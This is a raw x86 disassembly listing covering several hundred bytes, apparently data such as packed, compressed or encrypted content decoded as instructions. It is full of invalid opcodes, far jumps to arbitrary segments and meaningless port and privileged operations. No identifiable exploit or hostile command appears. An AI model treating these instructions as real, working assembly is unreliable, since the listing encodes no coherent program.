  41eddb:	sub    esp,DWORD PTR [ebx+ecx*2+0x31]
  41eddf:	xor    DWORD PTR [ecx+0xe],esi
  41ede2:	push   edx
  41ede3:	(bad)  
  41ede4:	pop    esi
  41ede5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ede6:	cmp    bl,bh
  41ede8:	mov    DWORD PTR [edx-0x80],edx
  41edeb:	inc    eax
  41edec:	sar    DWORD PTR [ecx],cl
  41edee:	mov    ds:0x1c1aa5f0,eax
  41edf3:	adc    ebp,esp
  41edf5:	scas   al,BYTE PTR es:[edi]
  41edf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edf7:	retf   
  41edf8:	shl    dh,1
  41edfa:	je     0x41ed8c
  41edfc:	mov    ebx,0x41f397a3
  41ee01:	test   bh,dh
  41ee03:	push   edx
  41ee04:	push   edi
  41ee05:	jmp    0xcb9ad169
  41ee0a:	add    ecx,ebx
  41ee0c:	daa    
  41ee0d:	and    ebp,ecx
  41ee0f:	cmc    
  41ee10:	mov    eax,DWORD PTR [ebp+0x22]
  41ee13:	push   0xa6841401
  41ee18:	sub    al,BYTE PTR [eax]
  41ee1a:	lods   al,BYTE PTR ds:[esi]
  41ee1b:	aam    0x44
  41ee1d:	aam    0xa
  41ee1f:	scas   eax,DWORD PTR es:[edi]
  41ee20:	stos   DWORD PTR es:[edi],eax
  41ee21:	pop    eax
  41ee22:	dec    ecx
  41ee23:	mov    ds:0xf1a7eae0,al
  41ee28:	pop    esi
  41ee29:	das    
  41ee2a:	jbe    0x41eea6
  41ee2c:	pop    edx
  41ee2d:	outs   dx,DWORD PTR ds:[esi]
  41ee2e:	xchg   edx,eax
  41ee2f:	fldenv [ecx-0x2e]
  41ee32:	pop    ebx
  41ee33:	call   0xcc5da983
  41ee38:	xor    BYTE PTR [edx-0x6b],ah
  41ee3b:	outs   dx,DWORD PTR ds:[esi]
  41ee3c:	cwde   
  41ee3d:	loope  0x41ee30
  41ee3f:	add    DWORD PTR [eax],ebp
  41ee41:	xor    dl,ch
  41ee43:	loope  0x41ee9f
  41ee45:	lea    bp,[edi-0x16]
  41ee49:	mov    cl,0xd7
  41ee4b:	inc    eax
  41ee4c:	(bad)  
  41ee4d:	xchg   ebp,eax
  41ee4e:	mov    ebx,0xce406ef5
  41ee53:	stc    
  41ee54:	shr    BYTE PTR ds:0xc8181ddc,cl
  41ee5a:	or     al,0x6f
  41ee5c:	sbb    eax,DWORD PTR [ecx+0x6c55e52b]
  41ee62:	jo     0x41eeb1
  41ee64:	xor    bh,BYTE PTR [edi+0x751248da]
  41ee6a:	dec    eax
  41ee6b:	sbb    BYTE PTR [ebx+0x37],bh
	...
  41eed5:	add    BYTE PTR ds:0x7b197956,al
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0x671b:0xffcc74e7
  41eee7:	dec    esp
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	add    BYTE PTR [ecx],al
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	add    BYTE PTR [ebx-0x1c0ad675],al
  41eef4:	xlat   BYTE PTR ds:[ebx]
  41eef5:	cld    
  41eef6:	adc    al,0x9f
  41eef8:	adc    eax,0xa870fef5
  41eefd:	sbb    eax,0x2a8246
  41ef02:	mov    al,ds:0x3a354db8
  41ef07:	or     DWORD PTR [ebp+ebx*8-0x2c],ecx
  41ef0b:	mov    al,cl
  41ef0d:	call   0xd465:0x6260170c
  41ef14:	out    0xd4,al
  41ef16:	and    DWORD PTR [ebx-0x49],ebp
  41ef19:	retf   
  41ef1a:	das    
  41ef1b:	adc    edi,DWORD PTR [esi+0x3c4c3dba]
  41ef21:	call   0x2dde:0xbfa55042
  41ef28:	in     eax,dx
  41ef29:	add    al,0x1c
  41ef2b:	xor    al,0xad
  41ef2d:	retf   0xda5f
  41ef30:	(bad)  
  41ef31:	and    al,0xfa
  41ef33:	daa    
  41ef34:	es cwde 
  41ef36:	dec    ebp
  41ef37:	push   ebx
  41ef38:	leave  
  41ef39:	xchg   ebx,eax
  41ef3a:	jae    0x41efb6
  41ef3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef3d:	outs   dx,DWORD PTR ds:[esi]
  41ef3e:	dec    ebx
  41ef3f:	ds dec esi
  41ef41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef42:	push   eax
  41ef43:	(bad)  
  41ef44:	xchg   ebx,eax
  41ef45:	xchg   ebp,eax
  41ef46:	sbb    DWORD PTR [esi+eiz*4-0x70],ebp
  41ef4a:	stc    
  41ef4b:	mov    eax,ds:0xe3f15ceb
  41ef50:	sub    DWORD PTR [ecx],0x60
  41ef53:	(bad)  
  41ef54:	js     0x41ef7a
  41ef56:	mov    bh,0x92
  41ef58:	adc    cl,bl
  41ef5a:	or     edx,ebx
  41ef5c:	adc    al,BYTE PTR [ebp-0x4d777d86]
  41ef62:	mov    al,BYTE PTR [edx+0x1]
  41ef65:	iret   
  41ef66:	fwait
  41ef67:	retf   
  41ef68:	fimul  DWORD PTR [eax]
  41ef6a:	mov    dl,bl
  41ef6c:	mov    ecx,0x6a79e537
  41ef71:	lahf   
  41ef72:	scas   eax,DWORD PTR es:[edi]
  41ef73:	mov    ebx,0xe9672003
  41ef78:	shr    BYTE PTR [esi-0x3b536554],0x80
  41ef7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef80:	xchg   ecx,eax
  41ef81:	lahf   
  41ef82:	fs clc 
  41ef84:	sub    eax,0x9f5a151b
  41ef89:	lock dec edi
  41ef8b:	lahf   
  41ef8c:	mov    dl,0xa2
  41ef8e:	sbb    eax,0xdb748778
  41ef93:	div    DWORD PTR [ebx+0x2815775f]
  41ef99:	mov    WORD PTR [ebp-0x49746281],ds
  41ef9f:	inc    edx
  41efa0:	sub    bl,BYTE PTR [eax+0x78]
  41efa3:	sub    al,0x13
  41efa5:	sti    
  41efa6:	adc    al,0x41
  41efa8:	pop    es
  41efa9:	loop   0x41ef60
  41efab:	adc    bl,al
  41efad:	popf   
  41efae:	imul   edi,DWORD PTR [edi-0x64141722],0xfffffffe
  41efb5:	mov    ds:0x42b2ad12,eax
  41efbb:	pusha  
  41efbc:	xlat   BYTE PTR ds:[ebx]
  41efbd:	aaa    
  41efbe:	and    ebx,DWORD PTR [eax]
  41efc0:	pop    edi
  41efc1:	ins    DWORD PTR es:[edi],dx
  41efc2:	mov    al,ds:0x65738557
  41efc7:	(bad)  
  41efc8:	pop    edx
  41efc9:	jp     0x41ef58
  41efcb:	lods   al,BYTE PTR ds:[esi]
  41efcc:	cmp    al,0x2b
  41efce:	dec    esp
  41efcf:	push   ds
  41efd0:	gs jmp 0x5221:0xf7fc0448
  41efd8:	call   0xe4f810b0
  41efdd:	xchg   esp,eax
  41efde:	aam    0x8d
  41efe0:	adc    eax,0x1a6ab87f
  41efe5:	(bad)  
  41efe6:	daa    
  41efe7:	cmp    DWORD PTR [ebp-0x5f],esp
  41efea:	sahf   
  41efeb:	aad    0xd4
  41efed:	sub    eax,0x0
	...
  41f056:	mov    ecx,0xff25bf5d
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul ebx,DWORD PTR [eax-0x4d],0xffffff9a
  41f065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f066:	addr16 dec ebp
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	add    BYTE PTR [ecx],al
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	or     al,0xd2
  41f070:	mov    ebx,DWORD PTR [ebx-0x53ad052c]
  41f076:	pop    eax
  41f077:	jnp    0x41f076
  41f079:	and    al,0x9e
  41f07b:	pusha  
  41f07c:	adc    eax,ecx
  41f07e:	repz shl bh,cl
  41f081:	ja     0x41f0c6
  41f083:	bound  ecx,QWORD PTR [ebx-0x4d]
  41f086:	jb     0x41f0c6
  41f088:	jns    0x41f0cd
  41f08a:	inc    eax
  41f08b:	add    al,0x35
  41f08d:	jecxz  0x41f072
  41f08f:	adc    eax,0xab1395e7
  41f094:	cld    
  41f095:	jne    0x41f0a9
  41f097:	cmp    al,BYTE PTR [esi-0x79fa47b1]
  41f09d:	or     DWORD PTR [esi+ecx*2-0x2063d30a],0xfffffff5
  41f0a5:	mov    ebx,DWORD PTR [ebp-0x15]
  41f0a8:	jno    0x41f11d
  41f0aa:	sub    ecx,ebp
  41f0ac:	pop    ebp
  41f0ad:	ins    BYTE PTR es:[edi],dx
  41f0ae:	ja     0x41f04c
  41f0b0:	xchg   BYTE PTR [eax+0x3b],dl
  41f0b3:	and    ch,bh
  41f0b5:	test   bh,bh
  41f0b7:	mov    edi,0x1810bdc8
  41f0bc:	jne    0x41f130
  41f0be:	aad    0xb5
  41f0c0:	push   edi
  41f0c1:	popa   
  41f0c2:	push   ds
  41f0c3:	rcr    ecx,1
  41f0c5:	adc    eax,DWORD PTR [esp+edx*2+0x3dcf16ed]
  41f0cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0cd:	mov    bl,0xb0
  41f0cf:	mov    ecx,DWORD PTR [edi]
  41f0d1:	push   ds
  41f0d2:	hlt    
  41f0d3:	gs hlt 
  41f0d5:	in     al,0x19
  41f0d7:	pop    ecx
  41f0d8:	call   0x8314:0x1649d380
  41f0df:	popa   
  41f0e0:	adc    eax,0x33bb5481
  41f0e5:	jp     0x41f0b2
  41f0e7:	push   ecx
  41f0e8:	xor    DWORD PTR [edx-0x7f],ebx
  41f0eb:	dec    ecx
  41f0ec:	cmp    DWORD PTR [esi-0x3dab57e0],ebp
  41f0f2:	xchg   esp,eax
  41f0f3:	mov    dh,0x20
  41f0f5:	push   ebp
  41f0f6:	aas    
  41f0f7:	dec    esp
  41f0f8:	stc    
  41f0f9:	ror    DWORD PTR [eax+0x6],1
  41f0fc:	jp     0x41f094
  41f0fe:	push   esp
  41f0ff:	out    dx,eax
  41f100:	and    al,0x4b
  41f102:	push   edi
  41f104:	(bad)  
  41f105:	push   ecx
  41f106:	imul   ebp,DWORD PTR [ecx-0x4c],0xdf6f8611
  41f10d:	add    al,0x9a
  41f10f:	adc    BYTE PTR ds:0x62b47ac1,0xe9
  41f116:	push   0xffffffbc
  41f118:	test   al,0xc3
  41f11a:	adc    BYTE PTR [esi+0x4f],dl
  41f11d:	add    BYTE PTR [eax+0x2d],cl
  41f120:	jbe    0x41f0db
  41f122:	mov    ss,edx
  41f124:	jne    0x41f147
  41f126:	push   ss
  41f127:	inc    eax
  41f128:	outs   dx,BYTE PTR ds:[esi]
  41f129:	pop    esp
  41f12a:	jecxz  0x41f175
  41f12c:	mov    eax,0x804c76b7
  41f131:	test   BYTE PTR [ebp+ebp*8-0x9],0x9
  41f136:	(bad)  
  41f137:	ss lahf 
  41f139:	xchg   ecx,eax
  41f13a:	in     al,0x50
  41f13c:	les    ebp,FWORD PTR [edi]
  41f13e:	dec    eax
  41f13f:	cs dec esp
  41f141:	sub    DWORD PTR ds:0x9aa46288,ebp
  41f147:	or     DWORD PTR [ebp+0x617e6783],ecx
  41f14d:	jge    0x41f189
  41f14f:	fdivr  QWORD PTR gs:[ebx-0x1be63ad4]
  41f156:	cmc    
  41f157:	stos   BYTE PTR es:[edi],al
  41f158:	sub    al,0x92
  41f15a:	in     al,dx
  41f15b:	pop    esp
  41f15c:	and    al,0x1f
  41f15e:	mov    al,0xbe
  41f160:	xor    al,0x26
  41f162:	std    
  41f163:	adc    eax,0x4bc31a30
  41f168:	ins    BYTE PTR es:[edi],dx
  41f169:	sbb    BYTE PTR [ecx+0x11],0x55
  41f16d:	xchg   BYTE PTR [eax],al
	...
  41f1d3:	add    BYTE PTR [eax],al
  41f1d5:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4e67:0xaf732c35
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	add    BYTE PTR [ecx],al
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	xchg   dl,cl
  41f1f0:	fcom   DWORD PTR ds:0xac43a9b3
  41f1f6:	inc    esi
  41f1f7:	xor    BYTE PTR [ebx-0x22d41dd8],dh
  41f1fd:	push   edx
  41f1fe:	hlt    
  41f1ff:	jmp    0xf1575680
  41f204:	push   0xf247e65f
  41f209:	fsub   QWORD PTR [edx]
  41f20b:	imul   eax,DWORD PTR [eax-0x2f],0x43347e77
  41f212:	and    al,0x0
  41f214:	xor    eax,0x460b6e21
  41f219:	pop    edi
  41f21a:	mov    cl,0xa6
  41f21c:	sub    al,0x25
  41f21f:	jle    0x41f21e
  41f221:	mov    ebx,DWORD PTR [esi]
  41f223:	int3   
  41f224:	imul   eax,DWORD PTR [ecx+0x5308349f],0xffffff9a
  41f22b:	mov    al,ds:0xe50c0b58
  41f230:	pop    ebx
  41f231:	mov    esi,0xd0882f5c
  41f236:	aaa    
  41f237:	enter  0x9379,0x83
  41f23b:	mov    ah,0x38
  41f23d:	inc    ebx
  41f23e:	xchg   edx,eax
  41f23f:	in     eax,0x9d
  41f241:	add    DWORD PTR [esi+ebx*2],ebx
  41f244:	xlat   BYTE PTR ds:[ebx]
  41f245:	icebp  
  41f246:	call   0x8ea56f69
  41f24b:	sub    DWORD PTR [edx-0x4bd2bf82],ebx
  41f251:	push   cs
  41f252:	fidiv  WORD PTR [eax-0x1f]
  41f255:	popa   
  41f256:	or     al,0x2f
  41f258:	popa   
  41f259:	stos   BYTE PTR es:[edi],al
  41f25a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f25b:	mov    esi,0xb9bee06c
  41f260:	cli    
  41f261:	call   0xd6c65e57
  41f266:	jl     0x41f2b6
  41f268:	or     al,0xdd
  41f26a:	sbb    eax,0xfa4ab10f
  41f26f:	inc    esi
  41f270:	pop    ecx
  41f271:	sub    bh,0xec
  41f274:	bound  eax,QWORD PTR [ecx+0x4ee471c]
  41f27a:	loope  0x41f2c2
  41f27c:	xchg   edx,eax
  41f27d:	addr16 inc esi
  41f27f:	mov    WORD PTR ds:0x49d5824e,gs
  41f285:	mov    ecx,DWORD PTR [edx+ebp*1-0x4a378063]
  41f28c:	adc    ebx,edx
  41f28e:	and    esp,DWORD PTR [ebp-0x64064d2a]
  41f294:	mov    eax,ds:0x11a385d3
  41f299:	out    dx,al
  41f29a:	jg     0x41f272
  41f29c:	sbb    DWORD PTR [esi+0x74],0xcf313b56
  41f2a3:	pop    eax
  41f2a4:	popa   
  41f2a5:	lods   eax,DWORD PTR ds:[esi]
  41f2a6:	loopne 0x41f2a0
  41f2a8:	push   eax
  41f2a9:	mov    esi,0x3eb43793
  41f2ae:	or     al,0xe3
  41f2b0:	adc    DWORD PTR ds:0x7403663d,edi
  41f2b6:	pushf  
  41f2b7:	add    al,ah
  41f2b9:	test   eax,0x6aad081
  41f2be:	ins    BYTE PTR es:[edi],dx
  41f2bf:	stos   DWORD PTR es:[edi],eax
  41f2c0:	push   ebx
  41f2c1:	test   ch,bl
  41f2c3:	adc    eax,0x6d9d79b0
  41f2c8:	xchg   ecx,eax
  41f2c9:	cmp    al,dl
  41f2cb:	gs fucomip st,st(6)
  41f2ce:	adc    al,0x8f
  41f2d0:	dec    ecx
  41f2d1:	sahf   
  41f2d2:	das    
  41f2d3:	cmp    bh,BYTE PTR [edi]
  41f2d5:	outs   dx,BYTE PTR ds:[esi]
  41f2d6:	or     edx,0xd7ce0f8f
  41f2dc:	and    DWORD PTR gs:[esp+ebp*8],ecx
  41f2e0:	rol    esi,cl
  41f2e2:	ja     0x41f337
  41f2e4:	mov    dl,0x30
  41f2e6:	mov    dh,0x21
  41f2e8:	push   esp
  41f2e9:	pusha  
  41f2ea:	imul   edi,DWORD PTR [eax+0x698e],0x0
	...
  41f355:	add    BYTE PTR [ecx+0x1b],dl
  41f358:	jmp    DWORD PTR [esi-0x1]
  41f35b:	out    0xd9,al
  41f35d:	aas    
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f2f9
  41f363:	adc    ebp,DWORD PTR [edi+0x14f674f]
  41f369:	add    BYTE PTR [eax],al
  41f36b:	add    DWORD PTR [eax],eax
  41f36d:	add    BYTE PTR [eax+0x72],cl
  41f370:	xchg   ebp,eax
  41f371:	clc    
  41f372:	lods   eax,DWORD PTR ds:[esi]
  41f373:	sbb    dh,BYTE PTR [ebx-0x2f44599c]
  41f379:	mov    ecx,0xe02aaa72
  41f37e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f37f:	fnsave [ecx-0x54]
  41f382:	jp     0x41f3c7
  41f384:	mov    eax,0xd6e4f20e
  41f389:	hlt    
  41f38a:	dec    edx
  41f38b:	fidivr DWORD PTR [eax+0x3b]
  41f38e:	pop    ss
  41f38f:	popf   
  41f390:	shl    BYTE PTR [ecx],1
  41f392:	jge    0x41f3c7
  41f394:	jnp    0x41f3ca
  41f396:	stc    
  41f397:	cmc    
  41f398:	or     al,BYTE PTR [eax+0x10f54365]
  41f39e:	mov    ?,WORD PTR [ebx+0x74]
  41f3a1:	jecxz  0x41f368
  41f3a3:	jmp    0x41f3d1
  41f3a5:	jne    0x41f387
  41f3a7:	jbe    0x41f3f7
  41f3a9:	and    DWORD PTR [ecx],esp
  41f3ab:	sub    al,0x3d
  41f3ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3ae:	neg    BYTE PTR [esi+ecx*1-0x7e]
  41f3b2:	pop    ebx
  41f3b3:	mov    ch,0x75
  41f3b5:	lods   al,BYTE PTR ds:[esi]
  41f3b6:	test   eax,0x1c315d1c
  41f3bb:	test   al,0xa6
  41f3bd:	jl     0x41f3d6
  41f3bf:	cs xor eax,0xbc8af95f
  41f3c5:	push   cs
  41f3c6:	xchg   ecx,eax
  41f3c7:	jo     0x41f3fe
  41f3c9:	retf   0xeefc
  41f3cc:	lock cmps DWORD PTR es:[esi],DWORD PTR es:[edi]
  41f3cf:	xchg   dh,dl
  41f3d1:	xchg   ecx,eax
  41f3d2:	cs and eax,0xaf9cb81e
  41f3d8:	sub    BYTE PTR [ecx-0x26],al
  41f3db:	jge    0x41f362
  41f3dd:	cli    
  41f3de:	fistp  QWORD PTR [esi*4+0x5c191ec8]
  41f3e5:	fsub   QWORD PTR [ebx-0x722047a]
  41f3eb:	xor    BYTE PTR [esp+ebp*2-0x3760e5d6],ch
  41f3f2:	jg     0x41f412
  41f3f4:	xchg   esi,eax
  41f3f5:	push   0xffffff86
  41f3f7:	cld    
  41f3f8:	js     0x41f40b
  41f3fa:	imul   bh
  41f3fc:	mov    cl,0x2c
  41f3fe:	mov    al,ds:0xdb401876
  41f403:	pop    es
  41f404:	jbe    0x41f388
  41f406:	jno    0x41f3b8
  41f408:	add    BYTE PTR [ecx-0x5e],cl
  41f40b:	jns    0x41f404
  41f40d:	in     eax,dx
  41f40e:	enter  0x1c19,0xea
  41f412:	cld    
  41f413:	push   ebx
  41f414:	add    BYTE PTR [ecx],0x9c
  41f417:	mov    BYTE PTR [eax-0x7b],bl
  41f41a:	loopne 0x41f3ac
  41f41c:	dec    esp
  41f41d:	(bad)  
  41f41e:	std    
  41f41f:	jae    0x41f3d1
  41f421:	xor    al,0x9e
  41f423:	inc    eax
  41f424:	hlt    
  41f425:	or     ah,BYTE PTR [edi-0x5ac5064e]
  41f42b:	sahf   
  41f42c:	jmp    0x48a05605
  41f431:	mov    esp,0xa5327de2
  41f436:	and    DWORD PTR [ebp-0x63],0xffffffcc
  41f43a:	mov    edi,ecx
  41f43c:	push   eax
  41f43d:	pop    eax
  41f43e:	pop    edx
  41f43f:	mov    al,0x4e
  41f441:	retf   
  41f442:	retf   
  41f443:	mov    ah,BYTE PTR [ebx+0x45ec76b]
  41f449:	mov    BYTE PTR ds:0x91fc6256,dl
  41f44f:	sbb    bh,BYTE PTR [ecx+0x12a7ddcd]
  41f455:	or     dh,BYTE PTR [esi+0x2f7d60f7]
  41f45b:	pop    ss
  41f45c:	sbb    DWORD PTR [edx],edi
  41f45e:	jp     0x41f4b3
  41f460:	sahf   
  41f461:	dec    ecx
  41f462:	in     eax,dx
  41f463:	jnp    0x41f4d5
  41f465:	sbb    edx,DWORD PTR [esp+eax*1-0x57d09320]
  41f46c:	out    dx,al
  41f46d:	sub    BYTE PTR [eax],al
	...
  41f4d3:	add    BYTE PTR [eax],al
  41f4d5:	add    BYTE PTR [edi+eiz*8],bh
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0x39
  41f4e3:	xchg   esp,eax
  41f4e4:	jo     0x41f538
  41f4e6:	addr16 push eax
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	add    BYTE PTR [ecx],al
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	sub    eax,0x7f71c5e0
  41f4f3:	iret   
  41f4f4:	mov    WORD PTR [ecx+0x33],?
  41f4f7:	aaa    
  41f4f8:	jecxz  0x41f4fc
  41f4fa:	and    bh,ah
  41f4fc:	(bad)  [edx]
  41f4fe:	xor    BYTE PTR [esi+0x68],ch
  41f501:	xchg   BYTE PTR [ebx*2-0x243a3604],al
  41f508:	cmp    ebx,edx
  41f50a:	or     DWORD PTR [esi],ebx
  41f50c:	fmul   QWORD PTR [edx+0x58d771fb]
  41f512:	addr16 mov ds:0x8a38,eax
  41f516:	xlat   BYTE PTR ds:[ebx]
  41f517:	inc    ebx
  41f518:	bound  eax,QWORD PTR [esi-0x40b91a11]
  41f51e:	call   0x3e75:0x26dd1f70
  41f525:	dec    ebp
  41f526:	add    al,0x61
  41f528:	mov    bh,0x64
  41f52a:	shr    DWORD PTR [ecx+0x70],cl
  41f52d:	aaa    
  41f52e:	sar    BYTE PTR [esi+edx*8],0x1e
  41f532:	fcomi  st,st(6)
  41f534:	mov    dh,0x47
  41f536:	mov    edx,0x1abf20b5
  41f53b:	and    ecx,DWORD PTR [ecx+0x2fcaf214]
  41f541:	repz mov ecx,0x2bf20d17
  41f548:	daa    
  41f549:	aas    
  41f54a:	js     0x41f54e
  41f54c:	(bad)  
  41f54d:	fwait
  41f54e:	jmp    0x41f555
  41f550:	out    dx,eax
  41f551:	(bad)  
  41f553:	sub    eax,edx
  41f555:	outs   dx,BYTE PTR ds:[esi]
  41f556:	mov    ds:0xc1369869,eax
  41f55b:	out    dx,al
  41f55c:	call   0x4432f72c
  41f561:	mov    dh,0xd5
  41f563:	sub    DWORD PTR [ecx+ebx*1+0x19],ecx
  41f567:	pop    ecx
  41f568:	out    dx,eax
  41f569:	dec    esi
  41f56a:	dec    ecx
  41f56b:	aad    0xb4
  41f56d:	jo     0x41f554
  41f56f:	popf   
  41f570:	or     BYTE PTR [eax+0x70],ch
  41f573:	inc    esp
  41f574:	mul    BYTE PTR [esi+0x33ad3019]
  41f57a:	and    DWORD PTR [ecx+0x9],esp
  41f57d:	mov    ds:0x8ebbc0d6,eax
  41f582:	shl    bh,0xc7
  41f585:	lods   al,BYTE PTR ds:[esi]
  41f586:	jae    0x41f5b7
  41f588:	cmovl  ecx,DWORD PTR [esi-0x6f585f2f]
  41f58f:	or     ax,0xd0c1
  41f593:	loope  0x41f60c
  41f595:	jp     0x41f565
  41f597:	scas   al,BYTE PTR es:[edi]
  41f598:	or     eax,0xeb9e3840
  41f59d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f59e:	pop    ebp
  41f59f:	dec    esp
  41f5a0:	jb     0x41f614
  41f5a2:	fstp   QWORD PTR [ecx]
  41f5a4:	aam    0x3a
  41f5a6:	xlat   BYTE PTR ds:[ebx]
  41f5a7:	ins    BYTE PTR es:[edi],dx
  41f5a8:	jmp    0xd87cd05c
  41f5ad:	test   BYTE PTR [eax],al
  41f5af:	pop    esp
  41f5b0:	cmc    
  41f5b1:	xchg   ebp,eax
  41f5b2:	not    BYTE PTR [edi+0x7c9a159b]
  41f5b8:	pop    ebx
  41f5b9:	jne    0x41f5d8
  41f5bb:	lods   al,BYTE PTR ds:[esi]
  41f5bc:	cli    
  41f5bd:	aam    0x1e
  41f5bf:	icebp  
  41f5c0:	jge    0x41f5ee
  41f5c2:	mov    dh,0x18
  41f5c4:	inc    edx
  41f5c5:	repz push eax
  41f5c7:	sub    edi,edx
  41f5c9:	cmp    al,0xbc
  41f5cb:	push   es
  41f5cc:	int3   
  41f5cd:	js     0x41f640
  41f5cf:	sbb    edx,ecx
  41f5d1:	repnz mov ecx,0x56a5b7bc
  41f5d7:	pushf  
  41f5d8:	inc    eax
  41f5d9:	lods   eax,DWORD PTR ds:[esi]
  41f5da:	mov    dl,0x55
  41f5dc:	cdq    
  41f5dd:	and    ecx,DWORD PTR [edx+0x5004df1b]
  41f5e3:	sti    
  41f5e4:	cwde   
  41f5e5:	int    0x6b
  41f5e7:	xchg   esp,eax
  41f5e8:	jae    0x41f62a
  41f5ea:	mov    edx,0xd92206
	...
  41f653:	add    BYTE PTR [eax],al
  41f655:	add    BYTE PTR [eax+0x34],bh
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0xdc91:0x944ed422
  41f666:	addr16 push ecx
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	add    BYTE PTR [ecx],al
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	es cmp ecx,edx
  41f671:	popa   
  41f672:	mov    eax,ds:0x1a086bc2
  41f677:	cwde   
  41f678:	hlt    
  41f679:	mov    ah,bh
  41f67b:	xlat   BYTE PTR ds:[ebx]
  41f67c:	(bad)  
  41f67e:	ror    edx,0x45
  41f681:	xor    edx,esi
  41f683:	sub    BYTE PTR [edi+0x5b07035b],0x61
  41f68a:	sbb    DWORD PTR [edx],esp
  41f68c:	add    al,0xd8
  41f68e:	out    0x1c,eax
  41f690:	cmp    al,0x9a
  41f692:	pop    ds
  41f693:	jmp    0x9b5bfc65
  41f698:	mov    edi,0x8c82ba28
  41f69d:	add    DWORD PTR [ebx+0x3cbf1d91],esp
  41f6a3:	jae    0x41f62c
  41f6a5:	scas   al,BYTE PTR es:[edi]
  41f6a6:	jno    0x41f65b
  41f6a8:	call   0x346446dd
  41f6ad:	inc    ebx
  41f6ae:	hlt    
  41f6af:	lock imul ebp,DWORD PTR [ebx],0x93fac478
  41f6b6:	or     bl,BYTE PTR [ebp-0x3f]
  41f6b9:	mov    BYTE PTR [esi-0xe],dh
  41f6bc:	int    0xcb
  41f6be:	or     DWORD PTR [eax-0x5afd1d6e],0x7f58fdca
  41f6c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6c9:	push   0xffffff9b
  41f6cb:	in     eax,dx
  41f6cc:	xchg   ebx,eax
  41f6cd:	lahf   
  41f6ce:	stos   DWORD PTR es:[edi],eax
  41f6cf:	stc    
  41f6d0:	dec    edi
  41f6d1:	cdq    
  41f6d2:	in     al,dx
  41f6d3:	hlt    
  41f6d4:	sub    DWORD PTR [ecx],edi
  41f6d6:	add    al,bl
  41f6d8:	jge    0x41f748
  41f6da:	push   0x7d53e0a5
  41f6df:	add    eax,0xb7473f90
  41f6e4:	pop    eax
  41f6e5:	stc    
  41f6e6:	mov    ds,WORD PTR [edx+0x50]
  41f6e9:	sub    eax,0xef72ad2b
  41f6ee:	mov    dh,0x63
  41f6f0:	pop    esi
  41f6f1:	lods   eax,DWORD PTR ds:[esi]
  41f6f2:	jl     0x41f6ec
  41f6f4:	mov    bl,0xbf
  41f6f6:	ror    BYTE PTR [esp+ecx*2-0x61],1
  41f6fa:	push   esi
  41f6fb:	bound  eax,QWORD PTR [esp+esi*4]
  41f6fe:	xor    DWORD PTR [edi+0x73],ebp
  41f701:	xor    esp,DWORD PTR [edx]
  41f703:	out    0xb9,al
  41f705:	push   ebx
  41f706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f707:	xchg   esp,eax
  41f708:	inc    ebp
  41f709:	clc    
  41f70a:	mov    esi,0xa28e4c59
  41f70f:	outs   dx,BYTE PTR ds:[esi]
  41f710:	inc    esp
  41f711:	adc    BYTE PTR [esi-0x1c],cl
  41f714:	inc    ebp
  41f715:	sbb    dl,0xaa
  41f718:	pusha  
  41f719:	rcr    eax,cl
  41f71b:	cmp    esp,DWORD PTR [edi-0xca24c2f]
  41f721:	or     al,0x3c
  41f723:	adc    BYTE PTR [edx-0x1254fc4a],al
  41f729:	add    al,0xae
  41f72b:	out    0x66,eax
  41f72d:	out    dx,al
  41f72e:	sbb    al,0x5e
  41f730:	xor    eax,0x3b4d79bb
  41f735:	cmp    eax,DWORD PTR fs:[ebx]
  41f738:	add    ch,BYTE PTR [ecx-0x6]
  41f73b:	xchg   esi,eax
  41f73c:	jmp    0x7d01:0x9054aadf
  41f743:	shl    BYTE PTR [esi],0xbe
  41f746:	inc    esp
  41f747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f748:	add    cl,cl
  41f74a:	lods   al,BYTE PTR ds:[esi]
  41f74b:	jge    0x41f739
  41f74d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f74e:	add    DWORD PTR [edx],eax
  41f750:	test   al,0x76
  41f752:	add    eax,0x86904373
  41f757:	xor    edx,ebx
  41f759:	xlat   BYTE PTR ds:[ebx]
  41f75a:	jo     0x41f736
  41f75c:	repnz push ebx
  41f75e:	xchg   esi,eax
  41f75f:	jp     0x41f6fc
  41f761:	imul   edx,DWORD PTR [ecx],0x93609bd5
  41f767:	call   0x61af:0x34d70fcf
	...
  41f7d6:	xchg   edx,eax
